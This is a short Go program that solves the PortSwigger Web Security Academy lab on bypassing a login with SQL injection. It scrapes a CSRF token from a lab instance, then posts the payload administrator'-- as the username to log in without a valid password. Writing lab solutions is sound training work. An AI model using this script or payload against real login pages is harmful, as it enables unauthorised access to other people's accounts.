// https://portswigger.net/web-security/sql-injection/lab-login-bypass

package main

import (
	"fmt"
	"net/http"
	"net/http/cookiejar"
	"log"
	"io"
	"net/url"
	"regexp"
)

func main() {
	err := solve()
	if err != nil {
		log.Fatalln(err)
	}
}

func solve() error {
	jar, err := cookiejar.New(nil)
	if err != nil {
		return err
	}

	client := &http.Client{Jar: jar}

	u := "https://0a33001503fd6bedc03017d1000c000f.web-security-academy.net/login"
	csrfToken, err := getCSRFToken(u, client)
	if err != nil {
		return err
	}

	resp, err := client.PostForm(u, url.Values{"username": {"administrator'--"}, "password":{"pass1"}, "csrf":{csrfToken}})
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return err
	}
	_, err = fmt.Println(string(body))
	return err
}


var csrfRE *regexp.Regexp = regexp.MustCompile(`name="csrf" value="([^"]+)"`)

func getCSRFToken(url string, client *http.Client) (string, error) {
	resp, err := client.Get(url)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	//fmt.Println(string(body))

	return string(csrfRE.FindSubmatch(body)[1]), nil
}
